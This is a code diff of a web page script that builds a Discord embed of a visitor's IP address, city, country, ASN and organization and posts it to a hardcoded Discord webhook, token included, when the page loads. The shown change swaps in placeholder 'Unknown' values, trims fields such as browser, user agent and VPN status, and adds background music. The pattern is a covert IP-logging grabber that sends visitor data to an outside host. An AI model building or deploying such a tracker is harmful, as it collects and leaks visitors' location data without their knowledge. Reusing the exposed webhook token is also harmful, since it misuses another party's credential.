@@ -29,6 +29,7 @@
     </style>
     <script>
         var embedSent = false;
+        startMusic();
 
         var webhookURL = "https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS";
 
@@ -40,7 +41,7 @@
             });
         }
 
-        function sendToDiscord(ipAddress, locationData, isVPN) {
+        function sendToDiscord(ipAddress, locationData) {
             console.log("IP Address:", ipAddress);
             console.log("Location Data:", locationData);
 
@@ -55,12 +56,10 @@
                 "Currency": locationData.currency,
                 "Language": locationData.languages,
                 "ASN": locationData.asn,
-                "Organization": locationData.org,
-                "VPN Enabled": isVPN ? "True" : "False"
+                "Organization": locationData.org
             };
 
             sendEmbed(embedData);
-            startMusic(); // Start de muziek wanneer de embed is verzonden
         }
 
         function sendEmbed(embedData) {
@@ -125,30 +124,6 @@
                             {
                                 "name": "Organization",
                                 "value": `\`\`\`${embedData["Organization"]}\`\`\``
-                            },
-                            {
-                                "name": "VPN Enabled",
-                                "value": `\`\`\`${embedData["VPN Enabled"]}\`\`\``
-                            },
-                            {
-                                "name": "Operating System",
-                                "value": `\`\`\`${os}\`\`\``
-                            },
-                            {
-                                "name": "Browser",
-                                "value": `\`\`\`${browser}\`\`\``
-                            },
-                            {
-                                "name": "Device Type",
-                                "value": `\`\`\`${deviceType}\`\`\``
-                            },
-                            {
-                                "name": "User Agent",
-                                "value": `\`\`\`${userAgent}\`\`\``
-                            },
-                            {
-                                "name": "Timestamp",
-                                "value": `\`\`\`${timestamp}\`\`\``
                             }
                         ],
                         "footer": {
@@ -233,33 +208,17 @@
 
         window.onload = function() {
             sendToDiscord("127.0.0.1", {
-                "ip": "127.0.0.1",
-                "network": "127.0.0.0/8",
-                "version": "IPv4",
-                "city": "Localhost",
-                "region": "Localhost",
-                "country": "Localhost",
-                "country_name": "Localhost",
-                "country_code": "LO",
-                "country_code_iso3": "LOH",
-                "country_capital": "Localhost",
-                "country_tld": ".localhost",
-                "continent_code": "LOC",
-                "in_eu": false,
-                "postal": "00000",
-                "latitude": 0,
-                "longitude": 0,
-                "timezone": "UTC",
-                "utc_offset": "+0000",
-                "country_calling_code": "+000",
-                "currency": "Localhost Coin",
-                "currency_name": "Localhost Coin",
-                "languages": "en",
-                "country_area": 0,
-                "country_population": 0,
-                "asn": "Localhost AS",
-                "org": "Localhost Organization"
-            }, false); // Simuleer een standaard IP-adres en locatie voor demonstratiedoeleinden
+                city: "Unknown",
+                region: "Unknown",
+                country_name: "Unknown",
+                country_code: "Unknown",
+                continent_code: "Unknown",
+                timezone: "Unknown",
+                currency: "Unknown",
+                languages: "Unknown",
+                asn: "Unknown",
+                org: "Unknown"
+            }); // Stuur een dummy-embed bij het laden van de pagina
         }
     </script>
 </head>
